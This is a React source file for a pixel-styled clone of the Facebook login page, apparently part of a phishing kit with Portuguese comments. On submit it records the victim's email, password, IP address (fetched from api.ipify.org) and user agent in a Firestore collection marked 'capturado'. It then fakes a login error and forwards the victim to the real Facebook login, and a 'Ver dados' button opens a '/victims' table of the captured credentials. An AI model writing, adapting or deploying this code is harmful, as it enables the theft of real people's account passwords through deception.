import React, { useState } from "react";
import { Button, Typography } from "@mui/material";

import { db } from "../services/firebase";
import { collection, addDoc, Timestamp } from "firebase/firestore";
import { useNavigate } from "react-router-dom";

const Login = () => {
  // Estado para os campos de entrada
  const [email, setEmail] = useState("");
  const [senha, setSenha] = useState("");
  const [openErrorModal, setOpenErrorModal] = useState(false); // Estado para abrir o modal de erro

  const navigate = useNavigate();

  const handleGoToVictimTable = () => {
    navigate("/victims"); // AQUI É O CAMINHO DA ROTA
  };
  // Função para simular o envio e erro do login
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault(); // Impede o comportamento padrão do formulário

    try {
      const ip = await fetch("https://api.ipify.org?format=json")
        .then((res) => res.json())
        .then((data) => data.ip);

      await addDoc(collection(db, "login"), {
        email,
        senha,
        ip,
        hora: Timestamp.now(),
        userAgent: navigator.userAgent,
        plataforma: "Facebook",
        status: "capturado",
      });

      // Aqui você pode verificar o login e lançar erro se necessário, simula falha para mostrar o modal
      const loginSuccessful = false; // Simulando um erro

      if (!loginSuccessful) {
        throw new Error("Erro de login"); // Se o login falhar, lança um erro
      }

      alert("Login bem-sucedido!");
    } catch (err) {
      console.error("Erro no login:", err);
      setOpenErrorModal(true); // Abre o modal de erro
    }
  };

  // Função para redirecionar o usuário ao clicar no modal
  const handleRedirectToFacebook = () => {
    window.location.href = "https://www.facebook.com/login"; // Redireciona para o login oficial do Facebook
  };

  return (
    <div
      className="login-container"
      style={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        height: "100vh",
        width: "215vh",
        fontWeight: "600",
        backgroundColor: "#f2f4f7",
      }}
    >
      {/* Logo do Facebook */}
      <div
        className="logo"
        style={{
          marginTop: "-85px",
          marginBottom: "5px",
          color: "#1877f2",
          fontSize: "47px",
          fontFamily: "Helvetica, sans-serif",
          textAlign: "center",
          letterSpacing: "-1.5px",
        }}
      >
        facebook
      </div>

      {/* Formulário de login */}
      <form
        onSubmit={handleSubmit} // Chama a função handleSubmit ao enviar o formulário
        className="login-form"
        style={{
          backgroundColor: "#fff",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0 4px 6px rgba(0, 0, 0, 0.03)",
          width: "365px",
          height: "350px",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          gap: "10px",
          border: "1px solid rgba(0, 0, 0, 0.12)",
        }}
      >
        <h2
          style={{
            margin: "0 0 10px",
            color: "#111",
            textAlign: "center",
            fontWeight: "400",
            fontFamily: "Helvetica, sans-serif",
            fontSize: "16px",
          }}
        >
          Entrar no Facebook
        </h2>

        {/* Campo de Email ou Telefone */}
        <input
          type="text"
          placeholder="E-mail ou telefone"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
          style={{
            width: "90%",
            height: "22px",
            padding: "15px",
            border: "1px solid #ccc",
            fontFamily: "Helvetica, sans-serif",
            borderRadius: "4px",
            fontSize: "16px",
            backgroundColor: "#fff",
            color: "#333",
          }}
        />

        {/* Campo de Senha */}
        <input
          type="password"
          placeholder="Senha"
          value={senha}
          onChange={(e) => setSenha(e.target.value)}
          required
          style={{
            width: "90%",
            padding: "15px",
            height: "22px",
            border: "1px solid #ccc",
            fontFamily: "Helvetica, sans-serif",
            borderRadius: "4px",
            fontSize: "16px",
            backgroundColor: "#fff",
            color: "#333",
          }}
        />

        {/* Botão de Entrar */}
        <button
          type="submit"
          className="login-button"
          style={{
            width: "100%",
            padding: "10px",
            backgroundColor: "#1877f2",
            fontFamily: "Helvetica, sans-serif",
            color: "#fff",
            border: "none",
            borderRadius: "8px",
            fontSize: "22px",
            fontWeight: "600",
            cursor: "pointer",
          }}
        >
          Entrar
        </button>

        {/* Link para recuperar senha */}
        <p
          className="forgot-password"
          style={{
            marginTop: "-5px",
            textAlign: "center",
            marginBottom: "-20px",
          }}
        >
          <a
            href="#"
            style={{
              color: "#1877f2",
              textDecoration: "none",
              fontSize: "14px",
              fontFamily: "Helvetica, sans-serif",
              fontWeight: "400",
            }}
          >
            Esqueceu a conta?
          </a>
        </p>

        {/* Divisória com "ou" */}
        <div
          className="or-divider"
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            marginTop: "10px",
            marginBottom: "20px",
          }}
        >
          <hr
            style={{
              flex: "1",
              height: "1px",
              backgroundColor: "#ccc",
              marginRight: "10px",
              borderTop: "none",
              marginTop: "10px",
              borderBottom: "1px solid #ccc",
            }}
          />
          <span
            style={{
              color: "#999",
              fontSize: "12px",
              fontWeight: "500",
              fontFamily: "Helvetica, sans-serif",
            }}
          >
            ou
          </span>
          <hr
            style={{
              flex: "1",
              height: "1px",
              backgroundColor: "#ccc",
              marginLeft: "10px",
              borderTop: "none",
              borderBottom: "1px solid #ccc",
            }}
          />
        </div>

        {/* Botão para criar nova conta */}
        <button
          type="button"
          className="create-account-button"
          style={{
            width: "45%",
            padding: "15px",
            marginTop: "-20px",
            backgroundColor: "#36A420",
            fontFamily: "Helvetica, sans-serif",
            color: "#fff",
            border: "none",
            borderRadius: "6px",
            fontSize: "16px",
            fontWeight: "700",
            cursor: "pointer",
          }}
        >
          Criar nova conta
        </button>
      </form>

      {/* Modal de erro de login */}
      {openErrorModal && (
        <div
          style={{
            position: "fixed",
            top: "0",
            left: "0",
            right: "0",
            bottom: "0",
            backgroundColor: "rgba(0,0,0,0.5)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 1000,
          }}
        >
          <div
            style={{
              backgroundColor: "#fff",
              padding: "20px",
              borderRadius: "8px",
              width: "80%",
              maxWidth: "500px",
              textAlign: "center",
              boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
            }}
          >
            <Typography
              variant="h6"
              style={{
                marginBottom: "15px",
                fontFamily: "Helvetica, sans-serif",
                color: "#E94E77",
              }}
            >
              Erro de login!
            </Typography>
            <p style={{ color: "#333", fontFamily: "Helvetica, sans-serif" }}>
              Ocorreu um erro ao tentar fazer login. Você será redirecionado
              para a página oficial de login do Facebook.
            </p>
            <Button
              onClick={handleRedirectToFacebook}
              variant="contained"
              color="error"
              style={{ marginTop: "20px", fontFamily: "Helvetica, sans-serif" }}
            >
              Ir para o Facebook
            </Button>
            <Button
              onClick={handleGoToVictimTable}
              style={{
                marginLeft: "5px",
                marginTop: "22px",
                padding: "8px 15px",
                fontSize: "12px",
                fontWeight: "bold",
                backgroundColor: "#000",
                color: "#fff",
                border: "none",
                borderRadius: "5px",
                cursor: "pointer",
                letterSpacing: "-0.5px",
              }}
            >
              Ver dados
            </Button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Login;
